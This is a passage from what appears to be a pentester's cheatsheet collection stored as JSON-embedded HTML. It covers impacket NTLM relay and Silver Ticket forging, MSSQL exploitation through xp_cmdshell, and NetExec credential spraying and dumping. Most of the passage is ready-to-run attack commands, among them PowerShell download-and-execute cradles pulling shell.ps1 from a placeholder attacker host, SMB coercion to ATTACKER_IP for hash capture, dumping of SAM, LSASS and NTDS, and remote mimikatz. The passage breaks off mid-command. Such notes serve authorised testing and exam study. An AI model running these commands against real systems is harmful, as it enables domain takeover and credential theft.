-no-pass -dc-ip DC_IP\n\n# Useful built-in commands\nenable_xp_cmdshell\nxp_cmdshell whoami\nSELECT IS_SRVROLEMEMBER('sysadmin')\nSELECT IS_SRVROLEMEMBER('sysadmin', 'DOMAIN\\group')\nSELECT name, type_desc FROM sys.server_principals\n</code></pre>\n<hr>\n<h2 id=\"ntlm-relay\">NTLM Relay</h2>\n<h3 id=\"impacket-ntlmrelayx\">impacket-ntlmrelayx</h3>\n<p><strong>When</strong>: SMB signing is disabled on a target and you can coerce NTLM authentication — relay to SMB, LDAP, LDAPS, WinRM, or MSSQL instead of cracking the hash.</p>\n<pre><code class=\"language-bash\"># Relay to SMB → dump SAM\nimpacket-ntlmrelayx -tf targets.txt -smb2support\n\n# Relay to LDAP → domain enumeration / BloodHound data\nimpacket-ntlmrelayx -t ldap://DC_IP -smb2support\n\n# Relay to LDAPS → Shadow Credentials or RBCD setup\nimpacket-ntlmrelayx -t ldaps://DC_IP -smb2support --shadow-credentials --shadow-target 'target$'\nimpacket-ntlmrelayx -t ldaps://DC_IP -smb2support --delegate-access\n\n# Relay to WinRM → interactive shell (-i opens local SOCKS socket)\nimpacket-ntlmrelayx -t http://target:5985/wsman -smb2support -i\n\n# Relay to MSSQL → direct xp_cmdshell\nimpacket-ntlmrelayx -t mssql://target -smb2support -q &quot;EXEC xp_cmdshell 'whoami'&quot;\n</code></pre>\n<hr>\n<h2 id=\"ad-enumeration\">AD Enumeration</h2>\n<h3 id=\"impacket-lookupsid\">impacket-lookupsid</h3>\n<p><strong>When</strong>: you need the Domain SID (required for ticket forging) or want to enumerate users/groups by RID brute-force when LDAP is restricted.</p>\n<pre><code class=\"language-bash\"># Enumerate to RID 2000 (finds users, groups, computers)\nimpacket-lookupsid DOMAIN/user:password@DC_IP 2000\n\n# Anonymous // often works on older DCs\nimpacket-lookupsid DOMAIN/''@DC_IP\n\n# Extract what you need\nimpacket-lookupsid DOMAIN/user:password@DC_IP | grep &quot;Domain SID&quot;\nimpacket-lookupsid DOMAIN/user:password@DC_IP | grep -i &quot;IT\\|admin\\|group&quot;\n</code></pre>\n<hr>\n<h3 id=\"impacket-rpcdump\">impacket-rpcdump</h3>\n<p><strong>When</strong>: map exposed RPC interfaces on a host to identify attack surface (PrintSpooler, MS-EFSRPC, MS-DFSNM) before attempting coercion.</p>\n<pre><code class=\"language-bash\">impacket-rpcdump DOMAIN/user:password@target\nimpacket-rpcdump @target | grep -i &quot;spoolss\\|efsrpc\\|netlogon\\|dfsnm&quot;\n</code></pre>\n<hr>\n<h3 id=\"impacket-finddelegation\">impacket-findDelegation</h3>\n<p><strong>When</strong>: after getting initial domain access — enumerate accounts with unconstrained, constrained, or resource-based constrained delegation configured.</p>\n<pre><code class=\"language-bash\">impacket-findDelegation DOMAIN/user:password -dc-ip DC_IP\n</code></pre>\n<hr>\n<h2 id=\"quick-reference-silver-ticket-mssql-sysadmin\">Quick Reference // Silver Ticket → MSSQL sysadmin</h2>\n<pre><code class=\"language-bash\"># 1. Get Domain SID\nimpacket-lookupsid DOMAIN/user:password@DC_IP | grep &quot;Domain SID&quot;\n\n# 2. Get target group RID (e.g. IT group)\nimpacket-lookupsid DOMAIN/user:password@DC_IP 2000 | grep -i &quot;IT&quot;\n\n# 3. Compute NT hash from plaintext password\npython3 -c &quot;import hashlib,binascii; print(binascii.hexlify(hashlib.new('md4','PASSWORD'.encode('utf-16le')).digest()).decode())&quot;\n\n# 4. Forge Silver Ticket // inject IT group RID → sysadmin on MSSQL\nimpacket-ticketer \\\n  -nthash &lt;mssqlsvc_ntlm&gt; \\\n  -domain-sid S-1-5-21-... \\\n  -domain DOMAIN \\\n  -spn MSSQLSvc/target.DOMAIN:1433 \\\n  -user-id 500 \\\n  -groups '512,&lt;IT_RID&gt;' \\\n  Administrator\n\n# 5. Authenticate with forged ticket\nexport KRB5CCNAME=Administrator.ccache\nimpacket-mssqlclient -k DOMAIN/Administrator@target -no-pass -dc-ip DC_IP\n\n# 6. Verify and enable execution\nSELECT IS_SRVROLEMEMBER('sysadmin')\nenable_xp_cmdshell\nxp_cmdshell whoami\n</code></pre>\n<hr>\n<h2 id=\"common-flags\">Common Flags</h2>\n<table>\n<thead>\n<tr>\n<th>Flag</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>-hashes :NTLM</code></td>\n<td>Pass-the-hash (omit <code>LM:</code> prefix)</td>\n</tr>\n<tr>\n<td><code>-k</code></td>\n<td>Kerberos auth (reads <code>KRB5CCNAME</code>)</td>\n</tr>\n<tr>\n<td><code>-no-pass</code></td>\n<td>Skip password prompt — Kerberos only</td>\n</tr>\n<tr>\n<td><code>-dc-ip</code></td>\n<td>Force specific DC / KDC address</td>\n</tr>\n<tr>\n<td><code>-just-dc</code></td>\n<td>secretsdump: DCSync only, no SMB</td>\n</tr>\n<tr>\n<td><code>-just-dc-user</code></td>\n<td>secretsdump: DCSync single account</td>\n</tr>\n<tr>\n<td><code>-spn</code></td>\n<td>Target SPN for ticket forging</td>\n</tr>\n<tr>\n<td><code>-nthash</code></td>\n<td>NT hash for Silver/Golden ticket</td>\n</tr>\n<tr>\n<td><code>-domain-sid</code></td>\n<td>Domain SID for ticket forging</td>\n</tr>\n<tr>\n<td><code>-user-id</code></td>\n<td>RID to embed in ticket PAC</td>\n</tr>\n<tr>\n<td><code>-groups</code></td>\n<td>Comma-separated group RIDs to inject into PAC</td>\n</tr>\n<tr>\n<td><code>-impersonate</code></td>\n<td>getST: user to impersonate via S4U</td>\n</tr>\n<tr>\n<td><code>-outputfile</code></td>\n<td>Save hashes to file (GetNPUsers, GetUserSPNs)</td>\n</tr>\n</tbody>\n</table>",
      "snippet_body": "# 1. Get Domain SID\nimpacket-lookupsid DOMAIN/user:password@DC_IP | grep &quot;Domain SID&quot;\n\n# 2. Get target group RID (e.g. IT group)\nimpacket-lookupsid DOMAIN/user:password@DC_IP 2000 | grep -i &quot;IT&quot;\n\n# 3. Compute NT hash from plaintext password\npython3 -c &quot;import hashlib,binascii; print(binascii.hexlify(hashlib.new('md4','PASSWORD'.encode('utf-16le')).digest()).decode())&quot;\n\n# 4. Forge Silver Ticket // inject IT group RID → sysadmin on MSSQL\nimpacket-ticketer \\\n  -nthash <mssqlsvc_ntlm> \\\n  -domain-sid S-1-5-21-... \\\n  -domain DOMAIN \\\n  -spn MSSQLSvc/target.DOMAIN:1433 \\\n  -user-id 500 \\\n  -groups '512,<IT_RID>' \\\n  Administrator\n\n# 5. Authenticate with forged ticket\nexport KRB5CCNAME=Administrator.ccache\nimpacket-mssqlclient -k DOMAIN/Administrator@target -no-pass -dc-ip DC_IP\n\n# 6. Verify and enable execution\nSELECT IS_SRVROLEMEMBER('sysadmin')\nenable_xp_cmdshell\nxp_cmdshell whoami"
    },
    {
      "title": "MSSQL // Cheatsheet",
      "slug": "mssql-cheatsheet",
      "date": "",
      "tags": [],
      "desc": "Enumeration and exploitation via T-SQL queries. Client: impacket-mssqlclient DOMAIN/user:password@target",
      "body": "<h1 id=\"mssql-cheatsheet\">MSSQL // Cheatsheet</h1>\n<blockquote>\n<p>Enumeration and exploitation via T-SQL queries.\nClient: <code>impacket-mssqlclient DOMAIN/user:password@target</code></p>\n</blockquote>\n<h2 id=\"authentication-privilege-check\">Authentication &amp; Privilege Check</h2>\n<pre><code class=\"language-sql\">SELECT SYSTEM_USER                                                          -- current login\nSELECT USER_NAME()                                                          -- current db user\nSELECT IS_SRVROLEMEMBER('sysadmin')                                        -- 1 = yes\nSELECT IS_SRVROLEMEMBER('sysadmin', 'DOMAIN\\group')                       -- check specific principal\nSELECT name, type_desc, is_disabled FROM sys.server_principals             -- all logins\nSELECT r.name role, m.name member FROM sys.server_role_members rm JOIN sys.server_principals r ON rm.role_principal_id=r.principal_id JOIN sys.server_principals m ON rm.member_principal_id=m.principal_id -- role membership\nSELECT name FROM sys.server_principals WHERE IS_SRVROLEMEMBER('sysadmin', name)=1 -- who is sysadmin?\n</code></pre>\n<hr>\n<h2 id=\"database-enumeration\">Database Enumeration</h2>\n<pre><code class=\"language-sql\">SELECT name FROM sys.databases                                             -- list all databases\nSELECT DB_NAME()                                                           -- current database\nUSE &lt;dbname&gt;                                                               -- switch database\nSELECT name, database_id, create_date FROM sys.databases                  -- databases with metadata\n</code></pre>\n<hr>\n<h2 id=\"tables-columns\">Tables &amp; Columns</h2>\n<pre><code class=\"language-sql\">SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE'                          -- tables in current db\nSELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE'           -- with schema\nSELECT TABLE_NAME, COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS ORDER BY TABLE_NAME          -- all columns\nSELECT COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='&lt;table&gt;'               -- columns of a table\nSELECT * FROM &lt;table&gt;                                                                                    -- dump table\nSELECT TOP 10 * FROM &lt;table&gt;                                                                            -- first 10 rows\nSELECT COUNT(*) FROM &lt;table&gt;                                                                            -- row count\n</code></pre>\n<hr>\n<h2 id=\"searching-for-credentials\">Searching for Credentials</h2>\n<pre><code class=\"language-sql\">-- Find columns that look like passwords\nSELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE '%pass%' OR COLUMN_NAME LIKE '%pwd%' OR COLUMN_NAME LIKE '%secret%' OR COLUMN_NAME LIKE '%cred%'\n\n-- Find columns that look like usernames\nSELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE '%user%' OR COLUMN_NAME LIKE '%login%' OR COLUMN_NAME LIKE '%email%'\n\n-- Dump specific columns\nSELECT username, password FROM &lt;table&gt;\n</code></pre>\n<hr>\n<h2 id=\"linked-servers\">Linked Servers</h2>\n<pre><code class=\"language-sql\">SELECT name, product, provider, data_source FROM sys.servers               -- list linked servers\nEXEC sp_linkedservers                                                       -- alternative\nSELECT * FROM OPENQUERY(&lt;linked_srv&gt;, 'SELECT SYSTEM_USER')                -- run query on linked server\nSELECT * FROM OPENQUERY(&lt;linked_srv&gt;, 'SELECT IS_SRVROLEMEMBER(''sysadmin'')')\nEXEC ('xp_cmdshell ''whoami''') AT &lt;linked_srv&gt;                           -- exec on linked server (if sysadmin there)\n</code></pre>\n<hr>\n<h2 id=\"command-execution\">Command Execution</h2>\n<pre><code class=\"language-sql\">-- Requires sysadmin\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE\nEXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE\nEXEC xp_cmdshell 'whoami'\nEXEC xp_cmdshell 'whoami /priv'\nEXEC xp_cmdshell 'net user'\nEXEC xp_cmdshell 'ipconfig'\nEXEC xp_cmdshell 'powershell -c &quot;IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER/shell.ps1'')&quot;'\n</code></pre>\n<hr>\n<h2 id=\"file-read\">File Read</h2>\n<pre><code class=\"language-sql\">-- Read a local file (requires BULK INSERT or OPENROWSET)\nSELECT * FROM OPENROWSET(BULK 'C:\\Windows\\win.ini', SINGLE_CLOB) x\nSELECT * FROM OPENROWSET(BULK 'C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt', SINGLE_CLOB) x\nSELECT * FROM OPENROWSET(BULK 'C:\\inetpub\\wwwroot\\web.config', SINGLE_CLOB) x\n</code></pre>\n<hr>\n<h2 id=\"hash-capture-ntlm-coercion\">Hash Capture (NTLM Coercion)</h2>\n<pre><code class=\"language-sql\">-- Trigger outbound SMB auth → capture NetNTLMv2 with Responder\nEXEC xp_dirtree '\\\\ATTACKER_IP\\share'\nEXEC xp_fileexist '\\\\ATTACKER_IP\\share\\test'\nSELECT * FROM OPENROWSET(BULK '\\\\ATTACKER_IP\\share\\test', SINGLE_CLOB) x\n</code></pre>\n<hr>\n<h2 id=\"impersonation\">Impersonation</h2>\n<pre><code class=\"language-sql\">-- Find accounts you can impersonate\nSELECT distinct b.name FROM sys.server_permissions a JOIN sys.server_principals b ON a.grantor_principal_id=b.principal_id WHERE a.permission_name='IMPERSONATE'\n\n-- Impersonate a login\nEXECUTE AS LOGIN = 'sa'\nSELECT IS_SRVROLEMEMBER('sysadmin')                                       -- verify escalation\nREVERT                                                                     -- revert back\n</code></pre>\n<hr>\n<h2 id=\"active-directory-enumeration\">Active Directory Enumeration</h2>\n<blockquote>\n<p>Requires <code>xp_cmdshell</code> or a linked server with AD access.\nAlternatively, use <code>SELECT</code> on SID functions — no shell needed.</p>\n</blockquote>\n<h3 id=\"domain-sid\">Domain &amp; SID</h3>\n<pre><code class=\"language-sql\">-- Domain name the SQL Server is joined to\nEXEC xp_cmdshell 'powershell -c &quot;(Get-WmiObject Win32_ComputerSystem).Domain&quot;'\n\n-- Domain SID via PowerShell (no AD module needed)\nEXEC xp_cmdshell 'powershell -c &quot;(New-Object System.Security.Principal.NTAccount(''DOMAIN'',''Domain Users'')).Translate([System.Security.Principal.SecurityIdentifier]).Value&quot;'\n\n-- Domain SID directly from a known domain group SID (strip last subauthority)\nSELECT SUSER_SID('DOMAIN\\Domain Users')                                   -- returns binary SID\nSELECT master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\\Domain Users'))    -- hex SID\n\n-- Resolve a SID to name\nSELECT SUSER_SNAME(0x&lt;hex_sid&gt;)\n\n-- Get SID of a specific group/user\nSELECT SUSER_SID('DOMAIN\\IT')\nSELECT master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\\IT'))\n</code></pre>\n<blockquote>\n<p><strong>Domain SID</strong> = group SID minus the last <code>-&lt;RID&gt;</code> segment.\ne.g. <code>S-1-5-21-AAA-BBB-CCC-1105</code> → Domain SID is <code>S-1-5-21-AAA-BBB-CCC</code>, RID is <code>1105</code>.</p>\n</blockquote>\n<h3 id=\"users-groups-via-powershell-needs-xp_cmdshell\">Users &amp; Groups via PowerShell (needs xp_cmdshell)</h3>\n<pre><code class=\"language-sql\">-- List domain users\nEXEC xp_cmdshell 'powershell -c &quot;([adsisearcher]''(objectCategory=user)'').FindAll() | % { $_.Properties[''samaccountname''] }&quot;'\n\n-- List domain groups\nEXEC xp_cmdshell 'powershell -c &quot;([adsisearcher]''(objectCategory=group)'').FindAll() | % { $_.Properties[''samaccountname''] }&quot;'\n\n-- Members of a specific group\nEXEC xp_cmdshell 'powershell -c &quot;([adsisearcher]''(&amp;(objectCategory=group)(cn=IT))'').FindOne().Properties[''member'']&quot;'\n\n-- Get SID of a specific group\nEXEC xp_cmdshell 'powershell -c &quot;(New-Object System.Security.Principal.NTAccount(''DOMAIN'',''IT'')).Translate([System.Security.Principal.SecurityIdentifier]).Value&quot;'\n\n-- Get RID only (last component)\nEXEC xp_cmdshell 'powershell -c &quot;(New-Object System.Security.Principal.NTAccount(''DOMAIN'',''IT'')).Translate([System.Security.Principal.SecurityIdentifier]).Value.Split(''-'')[-1]&quot;'\n</code></pre>\n<h3 id=\"sid-parsing-silver-ticket-prep\">SID Parsing // Silver Ticket Prep</h3>\n<pre><code class=\"language-sql\">-- Get binary SID of IT group, convert to hex string\nSELECT master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\\IT'))\n\n-- Get binary SID of Domain Users (use to derive Domain SID)\nSELECT master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\\Domain Users'))\n</code></pre>\n<p>Parse the hex output with Python to extract Domain SID and RID:</p>\n<pre><code class=\"language-python\">import struct, binascii\nsid_hex = &quot;hex_from_query_without_0x&quot;\nb = bytes.fromhex(sid_hex)\nrev = b[0]; sub_count = b[1]\nauth = int.from_bytes(b[2:8], 'big')\nsubs = [struct.unpack_from('&lt;I', b, 8 + 4*i)[0] for i in range(sub_count)]\nprint(f&quot;S-{rev}-{auth}-&quot; + &quot;-&quot;.join(str(s) for s in subs[:-1]))   # Domain SID\nprint(f&quot;RID: {subs[-1]}&quot;)                                           # group RID\n</code></pre>\n<hr>\n<h2 id=\"useful-metadata\">Useful Metadata</h2>\n<pre><code class=\"language-sql\">SELECT @@VERSION                                                           -- MSSQL version\nSELECT @@SERVERNAME                                                        -- server name\nSELECT @@SERVICENAME                                                       -- service name\nSELECT HOST_NAME()                                                         -- hostname\nSELECT DEFAULT_DOMAIN()                                                    -- AD domain name\nEXEC xp_cmdshell 'hostname'\nEXEC xp_cmdshell 'whoami /all'\nEXEC xp_cmdshell 'net localgroup administrators'\n</code></pre>\n<hr>\n<h2 id=\"common-flags-impacket-mssqlclient\">Common Flags (impacket-mssqlclient)</h2>\n<table>\n<thead>\n<tr>\n<th>Flag</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>-k</code></td>\n<td>Kerberos auth (use with <code>KRB5CCNAME</code>)</td>\n</tr>\n<tr>\n<td><code>-no-pass</code></td>\n<td>Skip password prompt (Kerberos)</td>\n</tr>\n<tr>\n<td><code>-hashes :NTLM</code></td>\n<td>Pass-the-hash</td>\n</tr>\n<tr>\n<td><code>-dc-ip</code></td>\n<td>KDC address for Kerberos</td>\n</tr>\n<tr>\n<td><code>-port</code></td>\n<td>Custom port (default 1433)</td>\n</tr>\n<tr>\n<td><code>enable_xp_cmdshell</code></td>\n<td>Built-in helper to enable shell</td>\n</tr>\n<tr>\n<td><code>xp_cmdshell &lt;cmd&gt;</code></td>\n<td>Execute OS command</td>\n</tr>\n</tbody>\n</table>",
      "snippet_body": "-- List domain users\nEXEC xp_cmdshell 'powershell -c &quot;([adsisearcher]''(objectCategory=user)'').FindAll() | % { $_.Properties[''samaccountname''] }&quot;'\n\n-- List domain groups\nEXEC xp_cmdshell 'powershell -c &quot;([adsisearcher]''(objectCategory=group)'').FindAll() | % { $_.Properties[''samaccountname''] }&quot;'\n\n-- Members of a specific group\nEXEC xp_cmdshell 'powershell -c &quot;([adsisearcher]''(&(objectCategory=group)(cn=IT))'').FindOne().Properties[''member'']&quot;'\n\n-- Get SID of a specific group\nEXEC xp_cmdshell 'powershell -c &quot;(New-Object System.Security.Principal.NTAccount(''DOMAIN'',''IT'')).Translate([System.Security.Principal.SecurityIdentifier]).Value&quot;'\n\n-- Get RID only (last component)\nEXEC xp_cmdshell 'powershell -c &quot;(New-Object System.Security.Principal.NTAccount(''DOMAIN'',''IT'')).Translate([System.Security.Principal.SecurityIdentifier]).Value.Split(''-'')[-1]&quot;'"
    },
    {
      "title": "NetExec (nxc) // Cheatsheet",
      "slug": "netexec-nxc-cheatsheet",
      "date": "",
      "tags": [],
      "desc": "Network-scale enumeration, credential spraying and post-exploitation across Windows/*nix services. Binary: /usr/bin/nxc (fork di CrackMapExec, drop-in replacement).",
      "body": "<h1 id=\"netexec-nxc-cheatsheet\">NetExec (nxc) // Cheatsheet</h1>\n<blockquote>\n<p>Network-scale enumeration, credential spraying and post-exploitation across Windows/*nix services.\nBinary: <code>/usr/bin/nxc</code> (fork di CrackMapExec, drop-in replacement).</p>\n</blockquote>\n<h2 id=\"connection-syntax\">Connection Syntax</h2>\n<pre><code class=\"language-bash\"># Base\nnxc &lt;protocol&gt; &lt;TARGET&gt; -u '&lt;USER&gt;' -p '&lt;PASS&gt;'\n\n# Target = single host, CIDR, range or file\nnxc smb 10.10.10.0/24\nnxc smb targets.txt\n\n# Hash auth (NT hash // skip LM:)\nnxc smb &lt;DC&gt; -u '&lt;USER&gt;' -H '&lt;NT_HASH&gt;'\n\n# Kerberos (needs valid krb5.conf + kinit or aesKey / tgt)\nnxc smb &lt;DC&gt; -u WS26.OSCP.EXAM'&lt;USER&gt;' -k --use-kcache\nnxc smb &lt;DC&gt; -u '&lt;USER&gt;' --aesKey '&lt;KEY&gt;'\n\n# NULL / anonymous / guest\nnxc smb &lt;TARGET&gt; -u '' -p ''\nnxc smb &lt;TARGET&gt; -u 'guest' -p ''\n\n# Local auth (against local SAM instead of domain)\nnxc smb &lt;TARGET&gt; -u '&lt;USER&gt;' -p '&lt;PASS&gt;' --local-auth\n\n# Continue spray after first success (don't stop on valid)\nnxc smb &lt;TARGET&gt; -u users.txt -p 'Passw0rd!' --continue-on-success\n</code></pre>\n<p><strong>Protocols</strong>: <code>smb</code>, <code>ldap</code>, <code>winrm</code>, <code>mssql</code>, <code>ssh</code>, <code>ftp</code>, <code>rdp</code>, <code>vnc</code>, <code>wmi</code>, <code>nfs</code>.</p>\n<hr>\n<h2 id=\"smb\">SMB</h2>\n<h3 id=\"host-discovery-signing\">Host Discovery &amp; Signing</h3>\n<pre><code class=\"language-bash\"># Scan a subnet // version, hostname, domain, signing (key for relay!)\nnxc smb 10.10.10.0/24\n\n# Filter by signing disabled (ntlmrelayx candidates)\nnxc smb 10.10.10.0/24 --gen-relay-list relay_targets.txt\n</code></pre>\n<h3 id=\"shares-files-users\">Shares, Files &amp; Users</h3>\n<pre><code class=\"language-bash\"># Enumerate shares + permissions\nnxc smb &lt;TARGET&gt; -u U -p P --shares\n\n# Spider readable shares for keywords\nnxc smb &lt;TARGET&gt; -u U -p P -M spider_plus\nnxc smb &lt;TARGET&gt; -u U -p P -M spider_plus -o EXCLUDE_DIRS='IPC$,print$' DOWNLOAD_FLAG=true\n\n# List files in a specific share\nnxc smb &lt;TARGET&gt; -u U -p P --share 'Data' --ls\n\n# Enum local users &amp; groups\nnxc smb &lt;TARGET&gt; -u U -p P --users\nnxc smb &lt;TARGET&gt; -u U -p P --groups\nnxc smb &lt;TARGET&gt; -u U -p P --loggedon-users\nnxc smb &lt;TARGET&gt; -u U -p P --sessions\nnxc smb &lt;TARGET&gt; -u U -p P --rid-brute 5000      # RID cycling (no creds needed if anon)\n\n# Password policy (pre-spray check)\nnxc smb &lt;TARGET&gt; -u U -p P --pass-pol\n</code></pre>\n<h3 id=\"password-spray\">Password Spray</h3>\n<pre><code class=\"language-bash\"># Single password, list of users (classic AD spray)\nnxc smb &lt;DC&gt; -u users.txt -p 'Spring2025!' --continue-on-success\n\n# Try userAsPass (username == password)\nnxc smb &lt;DC&gt; -u users.txt --continue-on-success\n\n# Multiple passwords (more invasive // watch lockout)\nnxc smb &lt;DC&gt; -u users.txt -p passwords.txt --continue-on-success\n\n# Only on domain member (local SAM, not AD)\nnxc smb 10.10.10.5 -u 'admin' -p passwords.txt --local-auth\n</code></pre>\n<h3 id=\"credential-dumping\">Credential Dumping</h3>\n<pre><code class=\"language-bash\"># SAM (local accounts // needs local admin)\nnxc smb &lt;TARGET&gt; -u U -p P --sam\n\n# LSA secrets (service accounts, cached domain creds)\nnxc smb &lt;TARGET&gt; -u U -p P --lsa\n\n# NTDS.dit (DCSync // needs DC + replication rights)\nnxc smb &lt;DC&gt; -u U -p P --ntds\nnxc smb &lt;DC&gt; -u U -p P --ntds --user 'krbtgt'    # only one account\n\n# LSASS memory (via procdump/comsvcs.dll)\nnxc smb &lt;TARGET&gt; -u U -p P -M lsassy\nnxc smb &lt;TARGET&gt; -u U -p P -M nanodump\n\n# DPAPI (master keys + creds)\nnxc smb &lt;TARGET&gt; -u U -p P --dpapi\n</code></pre>\n<h3 id=\"command-execution\">Command Execution</h3>\n<pre><code class=\"language-bash\"># Execute command (auto-picks best exec method)\nnxc smb &lt;TARGET&gt; -u U -p P -x 'whoami /all'\n\n# Force execution method: wmiexec / smbexec / atexec / mmcexec\nnxc smb &lt;TARGET&gt; -u U -p P -x 'whoami' --exec-method wmiexec\n\n# Run PowerShell (handles obfuscation, AMSI bypass with -M amsi_bypass)\nnxc smb &lt;TARGET&gt; -u U -p P -X '$PSVersionTable'\nnxc smb &lt;TARGET&gt; -u U -p P -X '(New-Object Net.WebClient).DownloadString(&quot;http://A/s.ps1&quot;)|iex'\n</code></pre>\n<hr>\n<h2 id=\"ldap\">LDAP</h2>\n<h3 id=\"domain-enumeration\">Domain Enumeration</h3>\n<pre><code class=\"language-bash\"># Base info\nnxc ldap &lt;DC&gt; -u U -p P\n\n# Users / computers / groups / trusts\nnxc ldap &lt;DC&gt; -u U -p P --users\nnxc ldap &lt;DC&gt; -u U -p P --groups\nnxc ldap &lt;DC&gt; -u U -p P --active-users           # exclude disabled\nnxc ldap &lt;DC&gt; -u U -p P --trusted-for-delegation\nnxc ldap &lt;DC&gt; -u U -p P --admin-count            # AdminCount=1 (protected)\nnxc ldap &lt;DC&gt; -u U -p P --dnsdump                # all DNS records via LDAP\nnxc ldap &lt;DC&gt; -u U -p P --get-sid\n\n# Password policy\nnxc ldap &lt;DC&gt; -u U -p P --password-policy\n</code></pre>\n<h3 id=\"kerberos-attacks\">Kerberos Attacks</h3>\n<pre><code class=\"language-bash\"># ASREPRoast (users with DONT_REQ_PREAUTH)\nnxc ldap &lt;DC&gt; -u U -p P --asreproast asrep.hash\nnxc ldap &lt;DC&gt; -u users.txt -p '' --asreproast asrep.hash    # no-creds scan\n\n# Kerberoast (users with SPN)\nnxc ldap &lt;DC&gt; -u U -p P --kerberoasting kerb.hash\n\n# Crack offline\nhashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt   # AS-REP\nhashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt    # TGS\n</code></pre>\n<h3 id=\"bloodhound-collection\">BloodHound Collection</h3>\n<pre><code class=\"language-bash\"># Full collection directly into ./BH-&lt;timestamp&gt;.zip\nnxc ldap &lt;DC&gt; -u U -p P --bloodhound --collection All --dns-server &lt;DC&gt;\n\n# Lightweight (faster, less noisy)\nnxc ldap &lt;DC&gt; -u U -p P --bloodhound --collection DCOnly\n</code></pre>\n<h3 id=\"ldap-modules\">LDAP Modules</h3>\n<pre><code class=\"language-bash\"># Find GMSA passwords (ReadGMSAPassword right)\nnxc ldap &lt;DC&gt; -u U -p P --gmsa\n\n# LAPS passwords (needs ReadLAPSPassword)\nnxc ldap &lt;DC&gt; -u U -p P -M laps\n\n# MAQ (ms-DS-MachineAccountQuota) // can we add computers?\nnxc ldap &lt;DC&gt; -u U -p P -M maq\n\n# Pre-Windows 2000 computer accounts (common weak pwd = computername)\nnxc ldap &lt;DC&gt; -u U -p P -M pre2k\n\n# Adcs enumeration (find vulnerable templates)\nnxc ldap &lt;DC&gt; -u U -p P -M adcs\n</code></pre>\n<hr>\n<h2 id=\"winrm\">WinRM</h2>\n<pre><code class=\"language-bash\"># Test creds (does this account have WinRM access?)\nnxc winrm &lt;TARGET&gt; -u U -p P\nnxc winrm &lt;TARGET&gt; -u U -H &lt;NTLM&gt;\n\n# Execute\nnxc winrm &lt;TARGET&gt; -u U -p P -x 'whoami'\nnxc winrm &lt;TARGET&gt; -u U -p P -X 'Get-ADUser -Filter *'\n\n# Spray against list of targets\nnxc winrm targets.txt -u users.txt -p 'Spring2025!' --continue-on-success\n</code></pre>\n<hr>\n<h2 id=\"mssql\">MSSQL</h2>\n<pre><code class=\"language-bash\"># Discovery + auth check\nnxc mssql &lt;TARGET&gt; -u U -p P\nnxc mssql &lt;TARGET&gt; -u 'sa' -p P --local-auth     # SQL Server auth, not AD\n\n# Query\nnxc mssql &lt;TARGET&gt; -u U -p P -q 'SELECT @@version'\n\n# xp_cmdshell (requires sysadmin or impersonation)\nnxc mssql &lt;TARGET&gt; -u U -p P -x 'whoami'\nnxc mssql &lt;TARGET&gt; -u U -p P -X 'powershell -c &quot;IEX(...)&quot;'\n\n# MSSQL-specific modules\nnxc mssql &lt;TARGET&gt; -u U -p P -M mssql_priv       # check for privesc paths\nnxc mssql &lt;TARGET&gt; -u U -p P -M nanodump\n</code></pre>\n<hr>\n<h2 id=\"ssh-ftp-rdp-vnc\">SSH / FTP / RDP / VNC</h2>\n<pre><code class=\"language-bash\"># SSH (checks + command exec)\nnxc ssh &lt;TARGET&gt; -u users.txt -p passwords.txt --continue-on-success\nnxc ssh &lt;TARGET&gt; -u U -p P -x 'id; sudo -l'\nnxc ssh &lt;TARGET&gt; -u U --key-file id_rsa\n\n# FTP (anon + creds)\nnxc ftp &lt;TARGET&gt; -u 'anonymous' -p ''\nnxc ftp &lt;TARGET&gt; -u U -p P --ls\n\n# RDP (check creds work // no shell)\nnxc rdp &lt;TARGET&gt; -u U -p P\nnxc rdp &lt;TARGET&gt; -u U -p P --nla-screenshot       # screen pre-auth\nnxc rdp &lt;TARGET&gt; -u U -p P --screenshot           # grab desktop after login\n\n# VNC\nnxc vnc &lt;TARGET&gt; -p VNCPASSWORD\n</code></pre>\n<hr>\n<h2 id=\"modules-l-to-list-m-name-to-run\">Modules (<code>-L</code> to list, <code>-M &lt;name&gt;</code> to run)</h2>\n<pre><code class=\"language-bash\"># List all modules\nnxc smb -L\nnxc ldap -L\nnxc mssql -L\n\n# Common SMB modules\nnxc smb &lt;T&gt; -u U -p P -M enum_av                 # AV/EDR installed?\nnxc smb &lt;T&gt; -u U -p P -M enum_chrome             # saved Chrome creds\nnxc smb &lt;T&gt; -u U -p P -M mimikatz                # fire mimikatz remotely\nnxc smb &lt;T&gt; -u U -p P -M masky                   # PKINIT cert → NT hash\nnxc smb &lt;T&gt; -u U -p P -M petitpotam              # coerce auth (relay target)\nnxc smb &lt;T&gt; -u U -p P -M printnightmare\nnxc smb &lt;T&gt; -u U -p P -M zerologon               # CVE-2020-1472 check\nnxc smb &lt;T&gt; -u U -p P -M coerce_plus             # all coercion vectors\n\n# Module options\nnxc smb &lt;T&gt; -u U -p P -M lsassy -o BLOODHOUND=true\n</code></pre>\n<hr>\n<h2 id=\"relay-workflow-classic\">Relay Workflow (classic)</h2>\n<pre><code class=\"language-bash\"># 1. Find signing-disabled hosts\nnxc smb 10.10.10.0/24 --gen-relay-list relay.txt\n\n# 